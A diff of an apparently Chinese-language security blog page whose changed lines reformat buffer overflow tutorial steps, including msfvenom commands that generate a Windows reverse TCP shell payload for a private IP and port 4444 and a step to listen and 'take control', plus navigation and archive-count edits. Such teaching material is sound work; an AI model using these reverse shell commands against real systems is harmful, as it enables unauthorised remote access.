@@ -324,18 +324,28 @@
 </li>
 <li><p>重发buffer</p>
 <ol start="5">
-<li>生成Shellcode</li>
+<li>生成ShellCode</li>
 </ol>
 </li>
 <li><p>在msfvenom查找相应的payload</p>
-<figure class="hljs highlight plain"><figcaption><span>--list payloads|grep windows|grep reverse_tcp```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs msfvenom"><br>- 查看该payload生成需要哪些参数<br><br>  &#96;&#96;&#96;msfvenom -p windows&#x2F;shell_reverse_tcp --list-options<br></code></pre></td></tr></table></figure>
+<ul>
+<li><code>msfvenom --list payloads|grep windows|grep reverse_tcp</code></li>
+</ul>
 </li>
-<li><p><code>msfvenom --platform Windows -b &#39;\x00\x0a\x0d&#39; -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.0.112 -f py</code>  </p>
+<li><p>查看该Payload生成需要哪些参数</p>
+<ul>
+<li><code>msfvenom -p windows/shell_reverse_tcp --list-options</code></li>
+</ul>
 </li>
+<li><p>生成Payload</p>
+<ul>
+<li><code>msfvenom --platform Windows -b &#39;\x00\x01\x0d&#39; -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.0.112 LPORT=4444 -f py</code></li>
 </ul>
 <ol start="6">
-<li>在本地侦听4444端口（msfvenom没有写端口参数时的默认端口），执行脚本，拿到控制权。</li>
+<li>在本地侦听4444端口，执行脚本，拿到控制权</li>
 </ol>
+</li>
+</ul>
 <h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul>
 <li>汇编指令<ul>
 <li>JMP XXX         跳转到某寄存器</li>
@@ -365,6 +375,8 @@
       
     </div>
     <div class="page-nav-prev page-nav-item">
+      
+      <a href="/2020/09/20/%E5%90%8E%E6%B8%97%E9%80%8F-%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/" rel="prev" title="后渗透-文件传输"><span class="nav-title">后渗透-文件传输</span><i class="fas fa-angle-right"></i></a>
       
     </div>
   </nav>
@@ -448,7 +460,7 @@
     
     <div class="archives-count count-block">
       <div class="site-count-title">归档</div>
-      <div><a href="/archives/">24</a></div>
+      <div><a href="/archives/">25</a></div>
     </div>
     
     
